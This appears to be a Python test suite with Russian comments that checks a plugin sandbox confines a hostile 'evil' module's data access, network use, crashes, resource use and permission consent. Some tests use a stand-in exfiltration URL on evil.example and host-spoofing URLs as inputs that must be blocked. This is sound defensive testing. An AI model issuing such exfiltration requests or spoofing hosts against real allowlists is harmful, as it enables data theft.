"""«Злой» модуль не выходит за границы: данные, сеть, сбои, ресурсы, согласие (T-0055, R-0030, V-0082)."""

from __future__ import annotations

import time
from datetime import datetime, timezone

import pytest

from core import modules, sandbox, userdata
from core.manifest import ManifestError, ModuleManifest, check_manifest
from core.models import ModuleState, SrsCard
from core.sandbox import Limits, ModuleContext, SandboxError
from core.userdata import DataAccessError, DataType
from tests.conftest import make_user


def evil_module(
    *, requires=("data.srs_card",), network=("api.allowed.example",), mid="evil", version="1.0"
):
    class Evil(modules.BackendModule):
        id = mid
        manifest = ModuleManifest(
            mid, "Злой", version, requires=frozenset(requires), network=frozenset(network)
        )

    return Evil()


@pytest.fixture(autouse=True)
def _clean(monkeypatch):
    modules.reset_state_cache()
    sandbox.reset_counters()
    yield
    modules.reset_state_cache()
    sandbox.reset_counters()


@pytest.fixture
def installed(session, monkeypatch):
    """Подключает «злой» модуль рядом с базовыми и возвращает (модуль, контекст-фабрику)."""

    def install(mod, approve=True):
        monkeypatch.setattr(modules, "_modules", [*modules.load_modules(), mod])
        modules.sync_module_state(session)
        if approve:
            modules.approve(session, mod.id)
        return mod

    return install


def card(session, user):
    c = SrsCard(
        user_id=user.id,
        module="x",
        front={},
        back={},
        source="g",
        fsrs_state={},
        due_at=datetime.now(timezone.utc),
    )
    session.add(c)
    session.flush()


def ctx(session, mod, user, **kw):
    return ModuleContext(session, mod, user.id, userdata.types(modules.enabled_modules()), **kw)


# ---- данные: только через платформу и только свои ----


def test_module_cannot_reach_data_it_did_not_declare(session, installed):
    mod = installed(evil_module())
    user = make_user(session)

    with pytest.raises(DataAccessError) as e:
        ctx(session, mod, user).read("response", "украсть ответы")

    assert e.value.code == "not_declared"
    assert any(not x["allowed"] for x in userdata.access_log(session, user.id))


def test_module_without_consent_of_the_person_gets_nothing(session, installed):
    mod = installed(evil_module())
    user = make_user(session)
    card(session, user)

    with pytest.raises(DataAccessError) as e:
        ctx(session, mod, user).read("srs_card", "прочитать")
    assert e.value.code == "not_granted"


def test_context_is_bound_to_one_person_so_others_data_cannot_be_asked_for(session, installed):
    mod = installed(evil_module())
    me, victim = make_user(session), make_user(session)
    card(session, victim)
    userdata.set_permission(session, me.id, mod, "srs_card", "read", True)

    rows = ctx(session, mod, me).read("srs_card", "прочитать")

    assert rows == []  # у «злого» нет способа назвать чужой user_id


def test_module_cannot_pose_as_another_module(session, installed):
    mod = installed(evil_module())
    user = make_user(session)
    c = ctx(session, mod, user)

    with pytest.raises(TypeError):
        c.read("srs_card", "x", module_id="srs")  # type: ignore[call-arg]
    assert not hasattr(c, "module_id")


# ---- сеть закрыта по умолчанию ----


def test_network_is_closed_except_for_declared_addresses(session, installed):
    mod = installed(evil_module())
    user = make_user(session)
    c = ctx(session, mod, user, fetcher=lambda url: b"ok")

    assert c.fetch("https://api.allowed.example/data") == b"ok"
    with pytest.raises(SandboxError) as e:
        c.fetch("https://evil.example/steal?x=1")
    assert e.value.code == "network_denied"


def test_module_without_declared_addresses_has_no_network_at_all(session, installed):
    mod = installed(evil_module(network=()))

    with pytest.raises(SandboxError) as e:
        ctx(session, mod, make_user(session), fetcher=lambda url: b"ok").fetch(
            "https://api.allowed.example/"
        )
    assert e.value.code == "network_denied"


def test_declared_address_without_a_configured_transport_is_unavailable(session, installed):
    mod = installed(evil_module())

    with pytest.raises(SandboxError) as e:
        ctx(session, mod, make_user(session)).fetch("https://api.allowed.example/")
    assert e.value.code == "network_unavailable"


def test_host_spoofing_by_userinfo_or_suffix_does_not_pass(session, installed):
    mod = installed(evil_module())
    c = ctx(session, mod, make_user(session), fetcher=lambda url: b"ok")

    for url in (
        "https://api.allowed.example.evil.example/",
        "https://evil.example@evil.example/",
        "https://evil.example/api.allowed.example",
    ):
        with pytest.raises(SandboxError):
            c.fetch(url)


def test_oversized_response_is_rejected(session, installed):
    mod = installed(evil_module())
    c = ctx(
        session,
        mod,
        make_user(session),
        fetcher=lambda url: b"x" * 50,
        limits=Limits(max_fetch_bytes=10),
    )

    with pytest.raises(SandboxError) as e:
        c.fetch("https://api.allowed.example/")
    assert e.value.code == "response_too_large"


def test_invalid_network_address_in_manifest_is_refused():
    with pytest.raises(ManifestError) as e:
        check_manifest(ModuleManifest("bad", "Bad", "1.0", network=frozenset({"http://x/"})))
    assert e.value.code == "bad_network"


# ---- сбой не роняет ядро ----


def test_crash_of_the_module_is_contained_and_core_keeps_working(session, installed):
    mod = installed(evil_module())

    def boom():
        raise RuntimeError("взрыв")

    with pytest.raises(SandboxError) as e:
        sandbox.guarded(session, mod, boom)
    assert e.value.code == "module_failed"
    assert sandbox.guarded(session, mod, lambda: 42) == 42  # следующий вызов живёт


def test_repeated_crashes_stop_the_module_but_not_the_others(session, installed):
    mod = installed(evil_module())

    def boom():
        raise RuntimeError("взрыв")

    for _ in range(3):
        with pytest.raises(SandboxError):
            sandbox.guarded(session, mod, boom)

    assert modules.is_enabled("evil") is False
    assert modules.is_enabled("srs") and modules.is_enabled("knowledge")
    with pytest.raises(SandboxError) as e:
        sandbox.guarded(session, mod, lambda: 1)
    assert e.value.code == "module_disabled"


def test_success_resets_the_failure_streak(session, installed):
    mod = installed(evil_module())

    def boom():
        raise RuntimeError("x")

    for _ in range(2):
        with pytest.raises(SandboxError):
            sandbox.guarded(session, mod, boom)
    sandbox.guarded(session, mod, lambda: 1)
    for _ in range(2):
        with pytest.raises(SandboxError):
            sandbox.guarded(session, mod, boom)

    assert modules.is_enabled("evil") is True


# ---- ресурсы ограничены ----


def test_module_that_hangs_is_stopped_after_the_time_limit(session, installed):
    mod = installed(evil_module())
    started = time.monotonic()

    with pytest.raises(SandboxError) as e:
        sandbox.guarded(session, mod, lambda: time.sleep(5), limits=Limits(timeout_s=0.2))

    assert e.value.code == "timeout" and time.monotonic() - started < 2
    assert modules.is_enabled("evil") is False


def test_flood_of_calls_stops_the_module(session, installed):
    mod = installed(evil_module())
    limits = Limits(max_calls_per_minute=5)

    for _ in range(5):
        sandbox.guarded(session, mod, lambda: None, limits=limits)
    with pytest.raises(SandboxError) as e:
        sandbox.guarded(session, mod, lambda: None, limits=limits)

    assert e.value.code == "call_budget" and modules.is_enabled("evil") is False


def test_data_reads_count_against_the_same_budget(session, installed):
    mod = installed(evil_module())
    user = make_user(session)
    userdata.set_permission(session, user.id, mod, "srs_card", "read", True)
    c = ctx(session, mod, user, limits=Limits(max_calls_per_minute=3))

    for _ in range(3):
        c.read("srs_card", "x")
    with pytest.raises(SandboxError) as e:
        c.read("srs_card", "x")
    assert e.value.code == "call_budget"


def test_oversized_write_is_refused_before_it_reaches_the_store(session, installed):
    mod = installed(evil_module(requires=("data.srs_card",)))
    user = make_user(session)
    userdata.set_permission(session, user.id, mod, "srs_card", "write", True)
    written = []
    reg = userdata.types(modules.enabled_modules())
    reg["srs_card"] = DataType(
        "srs_card",
        "К",
        "core",
        "п",
        None,
        lambda s, u: [],
        lambda s, u: 0,
        write=lambda s, u, rec: written.append(rec) or len(rec),
    )
    c = ModuleContext(session, mod, user.id, reg, limits=Limits(max_write_bytes=100))

    with pytest.raises(SandboxError) as e:
        c.write("srs_card", "x", [{"blob": "z" * 500}])

    assert e.value.code == "write_too_large" and written == []


# ---- согласие на расширение разрешений ----


def test_third_party_module_waits_for_consent_before_it_runs(session, monkeypatch):
    mod = evil_module()
    monkeypatch.setattr(modules, "_modules", [*modules.load_modules(), mod])

    lines = modules.sync_module_state(session)

    assert modules.is_enabled("evil") is False
    assert modules.pending_consent(session, "evil") == ["data.srs_card", "net:api.allowed.example"]
    assert any("ждёт согласия" in line for line in lines)


def test_consent_enables_the_module(session, monkeypatch):
    mod = evil_module()
    monkeypatch.setattr(modules, "_modules", [*modules.load_modules(), mod])
    modules.sync_module_state(session)

    granted = modules.approve(session, "evil")

    assert "data.srs_card" in granted and modules.is_enabled("evil")
    assert modules.pending_consent(session, "evil") == []


def test_update_that_asks_for_more_is_disabled_until_new_consent(session, installed, monkeypatch):
    installed(evil_module(requires=("data.srs_card",), network=()))
    assert modules.is_enabled("evil")

    newer = evil_module(
        requires=("data.srs_card", "data.response"), network=("api.allowed.example",), version="1.1"
    )
    monkeypatch.setattr(
        modules, "_modules", [m for m in modules.load_modules() if m.id != "evil"] + [newer]
    )
    lines = modules.sync_module_state(session)

    assert modules.is_enabled("evil") is False
    assert modules.pending_consent(session, "evil") == ["data.response", "net:api.allowed.example"]
    assert any("отключён до согласия" in line for line in lines)

    modules.approve(session, "evil")
    assert modules.is_enabled("evil")


def test_update_that_asks_for_nothing_new_keeps_running(session, installed, monkeypatch):
    installed(evil_module())
    same = evil_module(version="1.1")
    monkeypatch.setattr(
        modules, "_modules", [m for m in modules.load_modules() if m.id != "evil"] + [same]
    )

    modules.sync_module_state(session)

    assert modules.is_enabled("evil") is True


def test_first_party_modules_are_not_stopped_by_consent(session):
    modules.sync_module_state(session)

    assert all(modules.is_enabled(m) for m in ("languages", "ml", "knowledge", "srs", "mnemonic"))
    assert session.query(ModuleState).filter(ModuleState.approved.is_(None)).count() == 0


def test_admin_approves_through_the_api(session, client, monkeypatch):
    mod = evil_module()
    monkeypatch.setattr(modules, "_modules", [*modules.load_modules(), mod])
    modules.sync_module_state(session)
    admin = client(make_user(session, superuser=True))

    listing = {m["id"]: m for m in admin.get("/modules").json()}
    assert listing["evil"]["pendingConsent"] and listing["evil"]["enabled"] is False
    r = admin.post("/modules/evil/approve")

    assert r.status_code == 200 and r.json()["enabled"] is True
    assert {m["id"]: m for m in admin.get("/modules").json()}["evil"]["pendingConsent"] == []
    assert client(make_user(session)).post("/modules/evil/approve").status_code == 403
